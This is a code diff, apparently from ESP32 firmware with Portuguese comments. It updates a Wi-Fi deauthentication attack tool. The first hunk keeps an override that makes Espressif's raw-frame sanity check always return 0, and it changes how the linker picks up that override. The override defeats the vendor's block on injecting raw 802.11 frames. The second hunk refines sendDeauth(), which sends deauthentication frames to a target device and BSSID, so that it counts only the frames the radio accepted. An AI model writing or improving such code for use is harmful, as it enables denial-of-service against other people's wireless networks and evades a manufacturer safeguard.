@@ -9,8 +9,11 @@
 extern TFT_eSPI tft;
 // ═══════════════════════════════════════════════════════════════════════════
 //  PATCH · anula a validação de frames 802.11
-//  Este override só funciona se o comando objcopy --weaken-symbol foi aplicado
-//  sobre libnet80211.a (veja o README do projeto)
+//  A partir do Arduino-ESP32 2.0.7+, a Espressif bloqueia esp_wifi_80211_tx()
+//  via ieee80211_raw_frame_sanity_check(). Este override retorna 0 (sempre
+//  permitir). Para que o LINKER use esta versão em vez da da libnet80211.a,
+//  o projeto usa a flag -Wl,-zmuldefs (definida no platformio.ini) — portanto
+//  NÃO é mais preciso rodar objcopy --weaken-symbol manualmente.
 // ═══════════════════════════════════════════════════════════════════════════
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg,
                                                  int32_t arg2,
@@ -107,8 +110,8 @@ static void sendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
     memcpy(&deauthFrame[4],  target, 6);   // destination
     memcpy(&deauthFrame[10], bssid,  6);   // source (BSSID)
     memcpy(&deauthFrame[16], bssid,  6);   // BSSID
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
-    deauthPackets++;
+    if (esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false) == ESP_OK)
+        deauthPackets++;   // conta só transmissões que o rádio realmente aceitou
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
